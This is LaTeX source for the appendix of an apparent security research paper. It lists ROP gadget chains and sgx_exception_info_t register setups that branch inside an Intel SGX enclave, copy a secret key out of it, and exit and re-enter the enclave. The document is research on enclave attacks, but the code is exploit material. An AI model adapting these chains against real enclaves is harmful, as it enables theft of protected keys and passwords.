%\onecolumn
\chapter{Conditional Chain}
\label{app:condition-gadget}
Conditional ROP-chain, the chain is triggered by using 
\texttt{sgx\_exception\_info\_t} structure that configures the initial	
registers (see Appendix~\ref{ssec:my-rop-chain}).
The \texttt{SP} register is perturbed if the value of 
\texttt{\&lastKey} differs from the value of \texttt{\&key} in order to 
pivot a true or a false ROP-chain, respectively.
%\begin{figure}[h]
	\begin{lstlisting}[style=CStyle,escapechar=@]	
	/// we set the following registers through
	/// a sgx_exception_info_t structure:
	/// rdi = &lastKey; last key exfiltrated
	/// rax = &key; current key loaded
	/// rdx = #offset; to pivot to the false ROP-chain
	/// rcx = &true-chain; address of the true ROP-chain
	mov eax, dword ptr [rax] ; ret
	mov rdi, qword ptr [rdi + 0x68] ; ret
	cmp eax, edi ; sete al ; movzx eax, al ; ret
	neg eax ; ret
	and eax, edx ; ret
	add rax, rcx ; ret
	xchg rax, rsp ; ret
	// 0x80 nops for padding
	// beginning of true ROP-chain
	pop rdi ; ret
	// context to pivot to the ROP-chain that implements the true branch
	&context_true
	// address of continue_execution function
	&continue_execution
	// beginning of false ROP-chain
	pop rdi ; ret 
	// context to pivot to the ROP-chain that implements the false branch
	&context_false
	// address of continue_execution function
	&continue_execution\end{lstlisting}
%	\caption{Conditional ROP-chain, the chain is triggered by using 
%		\texttt{sgx\_exception\_info\_t} structure that configures the initial	
%		registers (see Appendix~\ref{ssec:my-rop-chain}).
%		The \texttt{SP} register is perturbed if the value of 
%		\texttt{\&lastKey} differs from the value of \texttt{\&key} in order to 
%		pivot a true or a false ROP-chain, respectively.}
%	\label{fig:condition-chain}
%\end{figure}

%\begin{figure}[h]
%	\begin{lstlisting}[style=CStyle,escapechar=@]	
%/// we set the following registers through a sgx_exception_info_t structure:
%// rcx = &ctn // address of counter for internal status
%// rsi = 0
%// rdx = #offset // to pivot to the false ROP-chain
%// r10 = &true-chain // address of the true ROP-chain
%// rdi = 10 // number of elements to check
%mov eax, dword ptr [rcx] ; ret
%sub eax, edi ; ret
%neg eax ; ret
%adc esi, esi ; ret
%xor eax, eax ; ret // it avoids the side effect of the following gadget
%mov eax, esi ; mov rcx, rdi ; jne 0x70d8 ; ret
%neg eax ; ret
%and eax, edx ; ret
%add rax, r10 ; ret
%xchg rax, rsp ; ret 0x80
%// 0x80 nops for padding
%// beginning of true ROP-chain
%pop rdi ; ret 
%&context_true // context to pivot to the ROP-chain
%							// that implements the true branch
%&continue_execution // address of continue_execution function
%// beginning of false ROP-chain
%pop rdi ; ret 
%&context_false  // context to pivot to the ROP-chain 
%			 					// that implements the false branch
%&continue_execution // address of continue_execution function\end{lstlisting}
%	\caption{Condition ROP-chain, the chain is triggered by 
%	using 
%	\texttt{sgx\_exception\_info\_t} structure that configures the registers 
%	(see Appendix~\ref{ssec:my-rop-chain}).
%	The \texttt{SP} register is perturbed according to the value stored in 
%	\texttt{\&ctn} in order to pivot to a true or a false ROP-chain, 
%	respectively.}
%	\label{fig:condition-chain}
%\end{figure}

\section{Context-Switch Chain}
\label{app:context-switch-chain}
Details of the \texttt{sgx\_exception\_info\_t} 
structures used to leak the key and to switch outside the enclave.
The structures are used according to the techniques described in 
Appendix~\ref{ssec:my-rop-chain}.
%\begin{figure}[h]
	\begin{lstlisting}[style=CStyle,escapechar=@]
/* ...previous sgx_exception_info_t structures... */
// leaks the key outside the enclave
// memcpy(key, buff)
ctxPc[2].cpu_context.rsi = &key; // address of the key
ctxPc[2].cpu_context.rdi = &buff; // memory regions where leaking the key
ctxPc[2].cpu_context.rdx = KEY_LENGTH; // length of the key
ctxPc[2].cpu_context.rip = &memcpy;
// prepares the next boot chain in the workspace
// memcpy(boot_chain, workspace)
ctxPc[3].cpu_context.rdi = &workspace; // workspace address
ctxPc[3].cpu_context.rdx = sizeof(boot_chain);
ctxPc[3].cpu_context.rsi = &boot_chain_backup;
ctxPc[3].cpu_context.rip = &memcpy;
// set the fake OCALL frame in the enclave
// memcpy(fake_frame, enclave)
ctxPc[4].cpu_context.rdi = &fake_frame;
ctxPc[4].cpu_context.rdx = sizeof(fake_frame);
ctxPc[4].cpu_context.rsi = &fake_frame_backup;
ctxPc[4].cpu_context.rip = &memcpy;
// saves CPU extended states for asm_oret
// save_xregs(xsave_buffer)
ctxPc[5].cpu_context.rdi = &xsave_buffer;
ctxPc[5].cpu_context.rip = &save_xregs;
// sets the trusted thread as it is performing an OCALL
// update_ocall_lastsp(fake_frame)
ctxPc[6].cpu_context.rdi = fake_frame;
ctxPc[6].cpu_context.rip = &update_ocall_lastsp;
// pivots to the outside-chain
// eenclu[exit] -> outside_chain
ctxPc[7].cpu_context.rax = 0x4; // EEXIT
ctxPc[7].cpu_context.rsp = &outside_chain_stack;
ctxPc[7].cpu_context.rbx = &outside_chain_first_gadget;
ctxPc[7].cpu_context.rip = &enclu;\end{lstlisting}
%\caption{Details of the \texttt{sgx\_exception\_info\_t} 
%structures used to leak the key and to switch outside the enclave.
%The structures are used according to the techniques described in 
%Appendix~\ref{ssec:my-rop-chain}.}
%\label{fig:context-switch-trusted-chain}
%\end{figure}

Details of the outside ROP-chains used to resume 
payload inside the enclave.
%\begin{figure}[h]
	\begin{lstlisting}[style=CStyle,escapechar=@]
/* ...previous gadgets for shipping the password remotely... */
// gadgets to resume payload within the enclave
pop rax ; ret
0x2 // EENTER
pop rbx ; ret
&tcs_address
pop rdi ; ret // rdi = -2 -> ORET
0xfffffffffffffffe // -2
pop rcx ; ret // for async exit handler
&Lasync_exit_pointer
&enclu_urts\end{lstlisting}
%	\caption{Details of the outside ROP-chains used to resume 
%	payload inside 
%	the enclave.}
%	\label{fig:colntext-switch-outside-chain}
%\end{figure}
